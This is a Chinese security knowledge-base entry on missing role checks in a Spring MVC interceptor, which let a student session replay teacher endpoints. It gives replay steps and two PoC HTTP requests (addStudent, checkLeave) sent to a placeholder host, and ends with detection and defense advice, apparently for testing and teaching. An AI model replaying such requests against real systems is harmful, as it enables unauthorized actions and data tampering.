---
id: web-generic-auth-missing-function-level-role-check
title: 拦截器只验登录不验角色：学生会话重放教师接口实现垂直越权
type: scenario
domain: web
path: web/generic/auth
technique: missing-function-level-authz
aliases:
- 垂直越权
- 功能级授权缺失
- 水平/垂直权限绕过
- missing role check
tags:
- web
- authz
- vertical-privilege-escalation
- spring-mvc
- interceptor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:30:06+08:00'
  notes: 已对照原文与图15-22核对：LoginInterceptor 仅校验 session 中任一身份；getStudentList 有角色判断但 addStudent 无；学生会话重放成功新增学生，checkLeave 重新登录学生会话后响应审批成功。原文未涉及组件版本，未设置 affected_versions。未复现 PoC。
---

## 一句话结论

登录拦截器只判断会话里“有任意一种身份”就放行，而具体控制器方法不校验角色，导致低权限用户用自己的 Cookie 重放教师/管理员接口即可完成越权操作。

## 原理

集中式拦截器常见写法是：session 中存在 admin/teacher/student 任一对象就 `return true`，否则跳登录。这只回答了“是否登录”，没有回答“是否有权执行该操作”。如果控制器方法内部也不做角色判断，那么鉴权边界只剩“登录”，任何已登录用户都能调用任意接口。攻击者不需要伪造身份，只需保持自己的合法会话，把高权限用户请求中的 Cookie/Token 换成自己的，重放同一请求体即可。

## 触发条件

- 鉴权在拦截器/过滤器层只做登录校验；
- 控制器方法没有方法级角色注解或显式角色判断；
- 接口路径对低权限角色可达（未被 URL 级规则单独限制）；
- 业务对象 ID 由请求参数提供且未做归属校验（常同时存在水平越权）。

## 利用步骤

1. 用高权限账号操作目标功能，抓取完整请求（URL、方法、参数、Content-Type）；
2. 用低权限账号登录，取自己的会话 Cookie；
3. 在 Repeater 中把请求 Cookie 替换为低权限会话，保持请求体不变后发送；
4. 观察响应与业务数据变化；若 302 回登录，说明会话过期，重新登录后再试；
5. 对添加、删除、审批等同类接口批量测试，确认影响面。

## PoC

低权限学生会话调用教师/管理端添加学生接口：

```http
POST /student/addStudent HTTP/1.1
Host: target
Cookie: JSESSIONID=<student-session>
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="username"

attacker
------x
Content-Disposition: form-data; name="clazzId"

1
------x--
```

低权限会话调用请假审批接口：

```http
POST /leave/checkLeave HTTP/1.1
Host: target
Cookie: JSESSIONID=<student-session>
Content-Type: application/x-www-form-urlencoded

id=15&studentId=9&info=test&remark=&status=1
```

返回 `{"success":true,"message":"审批成功"}` 即越权成功。

## 变体与关联

- 同一应用内角色层级（学生 -> 教师 -> 管理员）往往都可互打，逐一替换 Cookie 即可测试；
- 水平越权：接口校验了角色但没校验对象归属，改 `id`/`studentId` 即可操作他人数据；
- 与 CSRF 组合：越权接口若无 Token，可用跨站请求让高权限用户代为执行；
- 关联：JWT 只验签名不验 role、前端路由守卫绕过（服务端未校验）。

## 检测与防御

- 检测：同一账号调用与其角色不符的接口；接口响应中出现高权限操作成功；权限矩阵测试中低角色请求返回 200；
- 防御：方法级授权（Spring Security `@PreAuthorize`、Shiro 注解）或集中策略引擎，默认拒绝；每个写操作同时校验“角色 + 数据归属”；拦截器只作为兜底，不作为唯一授权点；
- 测试：上线前用多角色会话矩阵自动化跑全部接口，比对预期权限。
